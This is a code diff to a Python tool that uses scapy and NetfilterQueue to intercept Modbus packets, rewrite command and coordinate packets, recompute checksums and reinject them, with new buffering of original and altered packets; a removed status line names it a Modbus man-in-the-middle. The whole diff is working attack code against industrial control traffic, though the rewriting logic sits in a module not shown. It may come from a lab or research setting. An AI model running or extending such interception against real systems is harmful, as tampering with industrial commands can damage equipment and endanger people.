@@ -2,6 +2,7 @@ from scapy.all import IP, TCP
 import threading, os, select
 from netfilterqueue import NetfilterQueue
 import Modbus as mb
+import Buffer as buffer
 
 # Handles nfq. Start, stop, callback, modify, etc.
 
@@ -24,15 +25,45 @@ class callbacks:
 
         if mb.is_commands(spkt):
             spkt = mb.modify_commands(spkt)
-            mb.print_scannable(spkt)
 
         elif mb.is_coord(spkt):
             spkt = mb.modify_coord(spkt)
-            mb.print_scannable(spkt)
 
         else:
             pkt.accept()
             return
+    
+        mb.print_scannable(spkt)
+
+        # Recalculate checksums
+        del spkt[TCP].chksum
+        del spkt[IP].chksum
+        del spkt[IP].len
+
+        pkt.set_payload(bytes(spkt))
+        pkt.accept()
+
+    def buffer_and_accept(pkt):
+        spkt = IP(pkt.get_payload())
+        buffer.put(spkt, False)
+        pkt.accept()
+
+    def buffer_and_modify(pkt):
+        spkt = IP(pkt.get_payload())
+        
+        buffer.put(spkt, False)
+
+        if mb.is_commands(spkt):
+            spkt = mb.modify_commands(spkt)
+
+        elif mb.is_coord(spkt):
+            spkt = mb.modify_coord(spkt)
+
+        else:
+            pkt.accept()
+            return
+
+        buffer.put(spkt, True)
 
         # Recalculate checksums
         del spkt[TCP].chksum
@@ -74,8 +105,6 @@ def _start():
     # Pipe for stop signaling
     stop_r, stop_w = os.pipe()
     poller.register(stop_r, select.POLLIN)
-
-    print("[*] NFQUEUE + Modbus MITM running...")
 
     try:
         while not stop_event.is_set():
